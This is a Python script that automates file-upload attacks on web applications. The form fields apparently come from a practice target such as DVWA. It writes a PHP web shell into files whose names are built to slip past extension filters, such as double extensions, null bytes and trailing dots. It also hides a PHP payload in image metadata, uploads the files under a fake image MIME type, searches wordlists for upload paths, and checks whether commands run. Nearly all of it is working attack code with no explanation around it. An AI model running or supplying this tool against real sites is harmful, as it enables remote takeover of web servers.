import requests
import os
import subprocess
import time
import urllib.parse

#REPORT_FILENAME = "vuln_report.txt"

def embed_php_in_image(image_file, output_file):
    """Embed PHP payload inside an image metadata using exiftool."""
    payload = "<?php system($_REQUEST['cmd']); ?>"
    try:
        subprocess.run(["exiftool", f"-Comment={payload}", image_file, "-o", output_file], check=True)
        print(f"[+] Embedded PHP payload inside {output_file}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error embedding payload: {e}")


def create_payloads():
    """Create PHP web shell payloads."""
    reverse_shell = """<html>
  <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <input type="text" name="cmd" autofocus id="cmd" size="80">
      <input type="submit" value="Execute">
    </form>
    <pre>
<?php
  if(isset($_GET['cmd'])) {
      system($_GET['cmd']);
  }
?>
    </pre>
  </body>
</html>"""

    payloads = [
        "shell.php.jpg",
        "shell.pHp5",
        "shell.png.php",
        "shell.php#.png",
        "shell.php%20",
        "shell.phpJunk123png",
        "shell.png.jpg.php",
        "shell.php%00.png",
        "shell.php...",
        "shell.php.png",
        "shell.asp::$data",
        "A" * 232 + ".php",
        "shell.php%0a",
        "shell.php%00",
        "shell.php%0d%0a",
        "shell.php#.png",
        "shell.phpJunk123png",
        "shell.png.jpg.php",
        "shell.php%00.png%00.jpg"
    ]

    created_files = []
    for filename in payloads:
        try:
            with open(filename, 'w') as f:
                f.write(reverse_shell)
            print(f"[+] Created payload: {filename}")
            created_files.append(filename)
        except Exception as e:
            print(f"[-] Error creating payload {filename}: {e}")

    # Embed PHP in an image
    embed_php_in_image("clean_image.jpg", "shell.jpg")
    created_files.append("shell.jpg")

    return created_files

def upload_file(upload_url, payload_filename, cookie):
    """
    Attempt to upload a file to the given upload_url using an acceptable MIME type.
    """
    data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
    mime_type = "image/png"  # Using a MIME type acceptable for image uploads
    files = {'uploaded': (payload_filename, open(payload_filename, 'rb'), mime_type)}
    try:
        print(f"[*] Uploading {payload_filename} with MIME type: {mime_type} to {upload_url}...")
        response = requests.post(upload_url, files=files, data=data, cookies=cookie)
        if "successfully uploaded!" in response.text:
            print("[+] File uploaded successfully!")
            return True
        else:
            print(f"[-] Upload failed with MIME type: {mime_type}")
    except Exception as e:
        print(f"[-] Upload error: {str(e)}")
    return False

def upload_files(payload_filenames, upload_url, local_upload_path, cookie):
    """Upload payloads and verify if they are uploaded successfully."""
    uploaded_files = []
    failed_files = []

    for filename in payload_filenames:
        data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
        mime_type = "image/png"
        files = {'uploaded': (filename, open(filename, 'rb'), mime_type)}

        try:
            print(f"[*] Uploading {filename} with MIME {mime_type} to {upload_url}...")
            response = requests.post(upload_url, files=files, data=data, cookies=cookie)
            if "successfully uploaded!" in response.text:
                print(f"[+] {filename} uploaded successfully (Response Confirmed)!")
                uploaded_files.append(filename)
                continue
            time.sleep(1)
            # Check if file exists locally, if a local path is provided
            if local_upload_path:
                upload_path = os.path.join(local_upload_path, filename)
                if os.path.exists(upload_path):
                    print(f"[+] {filename} uploaded successfully (Found in directory)!")
                    uploaded_files.append(filename)
                else:
                    print(f"[-] Upload failed for {filename} (File not found in directory).")
                    failed_files.append(filename)
            else:
                print(f"[-] Upload failed for {filename} (No local path provided).")
                failed_files.append(filename)
        except Exception as e:
            print(f"[-] Upload error for {filename}: {str(e)}")
            failed_files.append(filename)
    return uploaded_files, failed_files


def test_uploaded_files(uploaded_files, upload_dir, cookie):
    """Check if uploaded files execute commands using ?cmd=whoami."""
    successful_executions = []

    for filename in uploaded_files:
        test_url = f"{upload_dir}{filename}?cmd=whoami"
        try:
            print(f"[*] Testing execution: {test_url}")
            response = requests.get(test_url, cookies=cookie)
            if "www-data" in response.text:
                print(f"[+] Command execution successful for {filename}!")
                successful_executions.append(filename)
            else:
                print(f"[-] Command execution failed for {filename} (No www-data response).")
        except Exception as e:
            print(f"[-] Error testing {filename}: {str(e)}")
    return successful_executions

def try_upload_url(base_url, wordlist_file, cookie, payload_filename):
    """
    Try candidate upload URL paths from a wordlist until one succeeds.
    Lines starting with '#' are ignored.
    """
    with open(wordlist_file, "r") as f:
        candidate_paths = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    for path in candidate_paths:
        upload_url_candidate = base_url + path
        print(f"[*] Trying upload URL: {upload_url_candidate}")
        if upload_file(upload_url_candidate, payload_filename, cookie):
            print(f"[+] Upload succeeded with URL: {upload_url_candidate}")
            return upload_url_candidate
    return None

def get_upload_directory(base_url, wordlist_file, payload_filename, COOKIE):
    """
    Lines starting with '#' are ignored.
    """
    with open(wordlist_file, "r") as f:
        candidate_dirs = [line.strip() for line in f if not line.strip().startswith("#")]
    for d in candidate_dirs:
        response = requests.get(base_url + d + payload_filename, cookies=COOKIE)
        if response.status_code == 200:
            print(f"[*] Directly Accessible Upload directory: {base_url + d + payload_filename}")
            return base_url + d
        else:
            print(f"[-] Directory {base_url + d} not accessible.")
    return None
